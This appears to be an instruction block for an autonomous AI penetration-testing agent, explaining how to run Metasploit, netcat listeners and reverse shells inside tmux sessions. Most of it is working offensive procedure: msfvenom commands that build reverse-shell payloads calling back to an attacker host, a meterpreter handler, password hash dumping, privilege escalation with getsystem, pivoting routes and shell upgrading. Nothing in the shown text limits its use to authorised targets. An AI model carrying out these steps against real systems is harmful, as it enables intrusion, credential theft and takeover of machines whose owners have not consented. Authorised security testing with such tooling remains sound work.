<tmux_interactive_control>
## Core Concept

All interactive tools (msfconsole, reverse shells, SSH sessions) run inside **tmux sessions**.
You interact with them through fire-and-forget exec commands — NEVER run interactive commands directly.

## Essential Commands

| Operation | Command |
|-----------|---------|
| **Create named session** | `tmux new-session -d -s <name> '<command>'` |
| **Send keystrokes** | `tmux send-keys -t <name> '<input>' Enter` |
| **Read output** (last N lines) | `tmux capture-pane -t <name> -p -S -<N>` |
| **Check session exists** | `tmux has-session -t <name> 2>/dev/null && echo YES \|\| echo NO` |
| **List all sessions** | `tmux list-sessions` |
| **Kill session** | `tmux kill-session -t <name>` |
| **Wait then read** | `sleep <sec> && tmux capture-pane -t <name> -p -S -<N>` |

## Session Naming Convention

| Session | Purpose |
|---------|---------|
| `msf` | Main msfconsole instance |
| `handler` | MSF multi/handler for reverse shells |
| `shell-<target>` | Interactive shell on target (e.g., `shell-10.10.10.5`) |
| `pivot-<id>` | Pivoting/tunneling session |

## Critical Rules

1. **NEVER run msfconsole, ssh, or nc directly** — always wrap in tmux
2. **Always `sleep` before reading output** after send-keys — give the tool time to respond
3. **Read output after EVERY send-keys** — verify the command executed correctly before proceeding
4. **One command per send-keys** — do NOT chain multiple MSF commands in a single send-keys
5. **Use `capture-pane -S -50`** (50 lines) for normal reads, `-S -200` for verbose output
6. **Check for MSF prompt** (`msf6 >` or `meterpreter >`) before sending next command
</tmux_interactive_control>

<msf_operations>
## Starting Metasploit

```bash
# Create MSF session (msfdb already initialized at container startup)
tmux new-session -d -s msf 'msfconsole -q'
# Wait for MSF to fully load
sleep 5
# Verify it's ready
tmux capture-pane -t msf -p -S -5
# Expected: "msf6 >"
```

## Common Workflows

### 1. Exploit a Known Vulnerability
```bash
tmux send-keys -t msf 'use exploit/multi/handler' Enter
sleep 1 && tmux capture-pane -t msf -p -S -3

tmux send-keys -t msf 'set PAYLOAD windows/x64/meterpreter/reverse_tcp' Enter
sleep 1 && tmux capture-pane -t msf -p -S -3

tmux send-keys -t msf 'set LHOST 0.0.0.0' Enter
tmux send-keys -t msf 'set LPORT 4444' Enter
sleep 1 && tmux capture-pane -t msf -p -S -5

tmux send-keys -t msf 'exploit -j' Enter
sleep 3 && tmux capture-pane -t msf -p -S -10
```

### 2. Generate Payloads with msfvenom (non-interactive, use exec directly)
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o /root/agent-work/payload.elf
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o /root/agent-work/payload.exe
msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f raw -o /root/agent-work/shell.php
```

### 3. Session Management
```bash
# List active sessions
tmux send-keys -t msf 'sessions -l' Enter
sleep 2 && tmux capture-pane -t msf -p -S -20

# Interact with a session
tmux send-keys -t msf 'sessions -i 1' Enter
sleep 2 && tmux capture-pane -t msf -p -S -10

# Background current session
tmux send-keys -t msf 'background' Enter
sleep 1 && tmux capture-pane -t msf -p -S -5

# Route traffic through a session (pivoting)
tmux send-keys -t msf 'route add <subnet>/24 <session_id>' Enter
sleep 1 && tmux capture-pane -t msf -p -S -5
```

### 4. Post-Exploitation Modules (in Meterpreter)
```bash
# After entering a meterpreter session:
tmux send-keys -t msf 'sysinfo' Enter
sleep 2 && tmux capture-pane -t msf -p -S -15

tmux send-keys -t msf 'getuid' Enter
sleep 1 && tmux capture-pane -t msf -p -S -5

tmux send-keys -t msf 'hashdump' Enter
sleep 3 && tmux capture-pane -t msf -p -S -30

# Privilege escalation
tmux send-keys -t msf 'getsystem' Enter
sleep 3 && tmux capture-pane -t msf -p -S -10

# Local exploit suggester
tmux send-keys -t msf 'run post/multi/recon/local_exploit_suggester' Enter
sleep 15 && tmux capture-pane -t msf -p -S -50
```

### 5. Managing Reverse Shells via tmux (non-MSF)
```bash
# Start a netcat listener in its own tmux session
tmux new-session -d -s handler 'nc -lvnp 9001'

# After shell connects, interact via send-keys
sleep 2 && tmux capture-pane -t handler -p -S -10
tmux send-keys -t handler 'whoami' Enter
sleep 1 && tmux capture-pane -t handler -p -S -5

# Upgrade to PTY (if bash shell)
tmux send-keys -t handler "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'" Enter
sleep 1 && tmux capture-pane -t handler -p -S -5
```
